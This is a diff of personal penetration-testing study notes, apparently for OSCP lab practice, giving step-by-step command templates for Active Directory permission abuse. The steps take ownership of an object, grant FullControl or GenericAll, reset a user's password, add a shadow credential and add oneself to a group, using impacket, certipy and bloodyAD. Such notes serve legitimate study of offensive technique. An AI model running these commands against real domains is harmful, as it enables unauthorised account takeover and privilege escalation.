@@ -1,16 +1,42 @@
 You can change the ownership of the object.
 # User
 
-#### Add a shadow credential:
+The workflow is:
+1. Make yourself the owner.
+2. Give yourself FullControl using `dacledit`.
+3. Abuse the resulting permissions.
+
+`WriteOwner → FullControl → Password Reset`
+
+**Step 1 — Change ownership**
+```
+impacket-owneredit -action write -new-owner alice -target bob 'corp.local/alice:Password123!' -dc-ip 10.10.10.10
+```
+
+**Step 2 — Give yourself FullControl**
+```
+impacket-dacledit -action write -rights FullControl -principal alice -target bob 'corp.local/alice:Password123!' -dc-ip 10.10.10.10
+```
+
+**Step 3 — Reset Bob's password**
+```
+impacket-changepasswd -reset -protocol smb-samr 'corp.local/bob@[ip]' -newpass 'NewPassword123!' -altuser 'corp.local/{AdminUser}' -altpass '{AdminPW}'
+```
+
+OR
+
+**Step 3 — Add a shadow credential**
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
-const command = `certipy-ad shadow auto -u [adminUser]@${discoveredDomain} -p [adminPW] -account '[targetUser]' -dc-ip ${ip}`;
+const command = `certipy-ad shadow auto -u [adminUser]@${discoveredDomain} -p [adminPW] -account '[targetUser]' -dc-ip DCIP`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+## Alternative bloodAD cmds
+
 #### Change Account Owner
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");
@@ -18,7 +44,7 @@ const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
 const ip = page?.IP ?? "NO IP FOUND";
 
-const command = `bloodyAD -d ${discoveredDomain} --host ${ip} -u [adminUser] -p [adminPW] set owner [targetAccountName] [AdminAccountName]`;
+const command = `bloodyAD -d ${discoveredDomain} --host DCIP -u [adminUser] -p [adminPW] set owner [targetAccountName] [AdminAccountName]`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
@@ -29,7 +55,7 @@ const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
 const ip = page?.IP ?? "NO IP FOUND";
 
-const command = `bloodyAD -d ${discoveredDomain} --host ${ip} -u [adminUser] -p [adminPW] add genericAll [targetUser] [adminUser]`;
+const command = `bloodyAD -d ${discoveredDomain} --host DCIP -u [adminUser] -p [adminPW] add genericAll [targetUser] [adminUser]`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
@@ -48,13 +74,12 @@ const command = `impacket-owneredit -action write -new-owner [adminUser] -target
 dv.paragraph("```bash\n" + command + "\n```");
 ```
 #### Modify Rights
-dacledit.py -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management 'certified'/'judith.mader':'judith09' -dc-ip 10.10.11.4
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
-const command = `impacket-dacledit -action 'write' -rights 'WriteMembers' -principal [adminUser] -target [groupName] '${discoveredDomain}'/'[adminUser]':'[adminPW]' -dc-ip ${ip}`;
+const command = `impacket-dacledit -action 'write' -rights 'WriteMembers' -principal [adminUser] -target [groupName] '${discoveredDomain}'/'[adminUser]':'[adminPW]' -dc-ip DCIP`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
@@ -77,4 +102,25 @@ const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 const command = `net rpc group members [group] -U "${discoveredDomain}"/"[adminUser]"%"[adminPW]" -S ${ip}`
 
 dv.paragraph("```bash\n" + command + "\n```");
+```
+
+## BloodAD Alternative
+
+### **Step 1 — Take ownership of the group**
+```
+bloodyAD -d EXAMPLE.COM --host <DC_IP> \
+-u [adminUser] -p '[adminPW]' \
+set owner 'TargetGroup' '[adminUser]'
+```
+### **Step 2 — Grant yourself GenericAll over the group**
+```
+bloodyAD -d EXAMPLE.COM --host <DC_IP> \
+-u [adminUser] -p '[adminPW]' \
+add genericAll 'TargetGroup' '[adminUser]'
+```
+### **Step 3 — Add yourself to the group**
+```
+bloodyAD -d EXAMPLE.COM --host <DC_IP> \
+-u [adminUser] -p '[adminPW]' \
+add groupMember 'TargetGroup' '[adminUser]'
 ```
